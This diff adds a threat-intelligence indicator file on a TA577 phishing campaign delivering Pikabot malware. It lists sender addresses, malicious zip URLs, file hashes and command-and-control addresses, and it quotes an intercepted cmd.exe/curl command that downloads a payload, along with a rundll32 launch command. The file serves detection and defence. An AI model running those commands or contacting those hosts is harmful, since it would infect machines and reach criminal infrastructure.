@@ -1,0 +1,111 @@
+THREAT IDENTIFICATION: TA577 / PIKABOT
+
+SUBJECTS OBSERVED
+All subjects were from previously stolen email threads.
+
+SENDERS OBSERVED
+backup@recarga-toner-df.com
+bnigs@kacita.co.ug
+eanj@riangintl.com
+kkris@lazurdrealestate.com
+kyra.gusikowski@cornerstoneadvisory.com.au
+lynn73@droghedastorage.ie
+mharvey@eltransbt.ro
+nprl.kiooenbden@roccadibenano.com
+nronjtosh@orajoepuit.fie.ee
+r.bneeyttar@dottec.inf.br
+support@proyectoservicio2018.info
+ym.lcrwjeehe@yunitcogroup.com
+
+INFECTION FLOW
+url -> zip -> js -> dll
+
+ZIP FILE DOWNLOAD REDIRECT URLS
+https://airtimetradersltd.co.ke/ah1pkc/?75271091
+https://betonsilimmakinasi.com.tr/v3c/?89371091
+https://catalogue-kiabi.ma/uvg7/?37481091
+https://konyanakliyatambari.com/szv/?51981091
+https://mediatrans9.com/kmo/?87681091
+https://gujaratidayro.in/96zbc/?47091091
+https://falmeida-solicitador.com.pt/p0umxv/?71191091
+https://golcularhurda.com.tr/gbuwv/?74391091
+https://mirzajans.com/97ni/?52491091
+https://universty.org/wrpdj/?15491091
+
+ZIP FILE DOWNLOAD URLS
+https://gujaratidayro.in/96zbc//?WIrDQwtB=1703090972
+https://universty.org/wrpdj//?JifZ=1703090972
+https://konyanakliyatambari.com/szv//?UrNdIMRj=1703090973
+https://airtimetradersltd.co.ke/ah1pkc//?mvMhlvp0cOQ=1703090972
+https://falmeida-solicitador.com.pt/p0umxv//?bekaccD=1703090974
+https://mirzajans.com/97ni//?9SwzPL5=1703090972
+https://catalogue-kiabi.ma/uvg7//?WEPhj7sfFyqz=1703090973
+https://golcularhurda.com.tr/gbuwv//?CKSZJHXXP2=1703090973
+https://betonsilimmakinasi.com.tr/v3c//?ouKsymEg=1703090974
+
+ZIP FILE HASHES
+15b9614f3f26dde77236f8ef6a76729a
+1ba8353bc3209f3a79812a742105e53b
+457a349e081be1a941f27773a9086abc
+5fafdd04d2235a3b54684f544d51f620
+705d1c43c43f5b7090fd8b28e8b522bb
+77c4dba8831adb069997e7e02824052f
+8752472e1730980b97a2e01b7f24a9da
+cd050b6adf647c37d61583cf16c959be
+ddb0bce5a7f168d84e206e6366e946c3
+(All files I saw were name "[A-Z]{2,5}\.zip")
+
+JAVASCRIPT FILE HASHES
+2d1310b4a6f990135fd9e0159f1e016e
+4b14f6ef9cb2e8061c8cdb89d1df5711
+7432f0847833ee259e66ae20fe132f61
+751f69f129b24295751a904d4bc3e74a
+87ee6391a6dfd87f94f4fb8a9560cfab
+c63d3267ce0a131725ee1f65a98d89c4
+d8e948c56c40f9b50f1e5c763345b69a
+ed74d1ec893ced4fe360b18b8901da7b
+f3a682b07d8a12eb1d7b696662922b64
+(All files I saw were name "O[a-z]{2}\.js")
+
+JAVASCRIPT SIGNATURE INFORMATION
+Name: The New Print Shop Ltd.
+Email: Not available
+Signing Time: Wednesday, December 20, 2023 11:41:06 AM
+
+BAT FILE HASH
+voluptas.p.bat
+a4dbfd6aef3b4045fe61aa0146debdf8
+
+BAT FILE CONTENTS
+cu
+(append to the "rl" listed in the string below to form "curl")
+
+INTERCEPTED COMMAND STRINGS
+"C:\Windows\System32\cmd.exe" /c echo rl "https://trenierad.com/1pBo3/371989961" --output "C:\Users\analyst\AppData\Local\Temp\atque.p" --ssl-no-revoke --insecure --location >> "C:\Users\analyst\AppData\Local\Temp\ea.f.bat"
+
+PAYLOAD DOWNLOAD URL
+https://trenierad.com/1pBo3/371989961
+
+DLL LAUNCH COMMAND
+"C:\Windows\System32\rundll32.exe" "C:\Users\analyst\AppData\Local\Temp\cumque.z" Enter
+
+DLL FILE HASH
+atque.p
+08a8172f5281aad3513f3b84851728db
+
+UNPACKED DLL FILE HASH
+2c0000.SearchProtocolHost.exe
+b8dbd3b7556d01d6dd83bd9efd1291ed
+
+PIKABOT C2s
+https://154.38.185.132:13786/unbosom/1WqM4mFBGRWNDnhRL?octapody=qmucyR1K8&BackswordmenGasconading=wnKWOTlSua&Reindeer=Photodromy
+https://172.232.189.134:2221/unbosom/1WqM4mFBGRWNDnhRL?octapody=qmucyR1K8&BackswordmenGasconading=wnKWOTlSua&Reindeer=Photodromy
+https://154.221.30.136:13724/unbosom/1WqM4mFBGRWNDnhRL?octapody=qmucyR1K8&BackswordmenGasconading=wnKWOTlSua&Reindeer=Photodromy
+https://185.187.235.158:23399/unbosom/1WqM4mFBGRWNDnhRL?octapody=qmucyR1K8&BackswordmenGasconading=wnKWOTlSua&Reindeer=Photodromy
+https://154.38.185.138:13786/unbosom/1WqM4mFBGRWNDnhRL?octapody=qmucyR1K8&BackswordmenGasconading=wnKWOTlSua&Reindeer=Photodromy
+https://149.28.252.250:5000/unbosom/1WqM4mFBGRWNDnhRL?octapody=qmucyR1K8&BackswordmenGasconading=wnKWOTlSua&Reindeer=Photodromy
+https://46.250.253.58:5243/unbosom/1WqM4mFBGRWNDnhRL?octapody=qmucyR1K8&BackswordmenGasconading=wnKWOTlSua&Reindeer=Photodromy
+https://154.38.185.135:13782/unbosom/1WqM4mFBGRWNDnhRL?octapody=qmucyR1K8&BackswordmenGasconading=wnKWOTlSua&Reindeer=Photodromy
+https://89.117.55.178:2083/unbosom/1WqM4mFBGRWNDnhRL?octapody=qmucyR1K8&BackswordmenGasconading=wnKWOTlSua&Reindeer=Photodromy
+https://172.232.7.224:9785/unbosom/1WqM4mFBGRWNDnhRL?octapody=qmucyR1K8&BackswordmenGasconading=wnKWOTlSua&Reindeer=Photodromy
+
